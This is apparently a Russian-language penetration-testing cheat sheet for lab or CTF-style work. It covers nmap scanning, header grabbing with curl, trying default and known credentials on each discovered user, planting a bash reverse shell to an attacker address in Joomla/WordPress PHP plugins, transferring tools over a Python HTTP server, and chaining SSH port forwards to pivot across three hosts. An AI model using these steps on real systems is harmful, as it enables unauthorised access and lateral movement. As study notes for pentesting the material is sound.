1. Первичное сканирование при попадании в сеть:
nmap -sn 192.168.0.0/24 (быстрый скан какие есть машины без проверки открытых портов)
nmap 10.10.234.3 (Просто скан с проверкой портов)
nmap -sV -sC -Pn -T4 -p- 10.10.234.3 (Тщательная проверка конкретного хоста)

2. Тянем через curl адреса, на которых есть открытые 80 порты. Возможно там есть имя сайтов
curl 10.10.234.3 -Iv (или lv)
Потом адрес с именем можно добавить себе в /etc/hosts

Ищем дефолтные креды. Каждый раз когда видим нового пользователя - перебираем все известные пароли для попытки входа.

Если у нас есть доступ к .php плагинам Joomla/Wordpress - добавляем в них
system("/bin/bash -i >& /dev/tcp/наш адрес/4444 0>&1")
После чего обращаемся к плагину и получаем reverse shell.

Один ищет на хосте, второй же параллельно забрасывает на хост nmap и исследует дальше
Чтобы забросить nmap делаем:
python3 -m http.server 8080 -d /home/user-1/Desktop/ (или другая папка где лежит подготовленный к работе nmap)
wget наш_адрес/файл  // curl

Если нам уже доступен ssh (любым способом попали в ssh оболочку), то мы можем выполнить проксирование дальше с использованием:
ssh -L local_ip:local_port:remote_ip:remote_port remote_user@victim-IP
(Например - ssh -L 10.10.10.1:8000:127.0.0.1:8080 user-1@10.10.10.2)
Более того, теперь перейдя по адресу атакуемого мы сможем увидеть его сайт, который висит на 127.0.0.1 (если таковой имеется)
Именно вышеописанная команда позволяет видеть все что на 127.0.0.1

Если же сайты нам не нужны, можем сделать так:
ssh user-1@10.10.10.2 -L 8000:127.0.0.1:8080
Но, стоит нам поменять 10.10.10.1 на 127.0.0.0.1, как мы тут же снова видим удаленный веб-сервер, но уже у себя на локальном порту 8000

Теперь представим ситуацию, что нам необходимо получить доступ к пк, который третий в цепочке
1. Доступ к user-3 мы хотим получить через порт 5000, значит, соединим этот порт с портом 6000 на user-1, причем порт 6000 открывается относительно второго сетевого интерфейса (10.10.11.1) на user-1. Таким образом, мы смогли соединить Kali Linux и user-1;
2. Далее соединим порт 6000, открытый ранее, с портом 7000 на user-2, причем порт 7000 открывается относительно второго сетевого интерфейса (10.10.12.1) на user-2;
3. Затем финальным шагом открываем порт 8000, на котором расположен веб-сервер, на хосте ***10.10.12.2*** и получаем доступ к веб-серверу через 2 хоста на Kali Linux по адресу http://10.10.10.1:5000

```sh
1. kali> ssh -L 10.10.10.1:5000:10.10.11.1:6000 user-1@10.10.10.2
	2. user-1> ssh -L 10.10.11.1:6000:10.10.12.1:7000 user-2@10.10.11.2
		3. user-2> ssh -L 10.10.12.1:7000:10.10.12.2:8000 user-3@10.10.12.2
			4. user-3>
